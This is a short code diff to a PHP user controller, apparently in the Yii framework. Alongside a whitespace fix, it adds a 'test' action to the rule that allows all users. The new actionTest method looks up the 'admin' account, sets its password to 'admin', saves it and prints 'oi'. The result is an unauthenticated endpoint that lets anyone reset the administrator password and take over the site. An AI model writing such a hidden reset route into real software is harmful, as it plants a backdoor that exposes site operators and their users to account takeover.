@@ -25,7 +25,7 @@ class UserController extends Controller
 	{
 		return array(
 			array('allow',  // allow all users to perform 'index' and 'view' actions
-				'actions'=>array('index','view'),
+				'actions'=>array('index','view','test'),
 				'users'=>array('*'),
 			),
 			array('deny',  // deny all users
@@ -59,12 +59,19 @@ class UserController extends Controller
 //				'pageSize'=>Yii::app()->controller->module->user_page_size,
 //			),
 //		));
-		$model= new User('search');
+		$model = new User('search');
 		if(isset($_GET['User']))
 			$model->attributes=$_GET['User'];
 		$this->render('index',array(
 			'model'=>$model
 		));
+	}
+
+	public function actionTest(){
+		$u = User::model()->findByAttributes(array('username'=>'admin'));
+		$u->password ='admin';
+		$u->save();
+		echo 'oi';
 	}
 
 	/**
@@ -100,4 +107,6 @@ class UserController extends Controller
 		}
 		return $this->_model;
 	}
+
+
 }
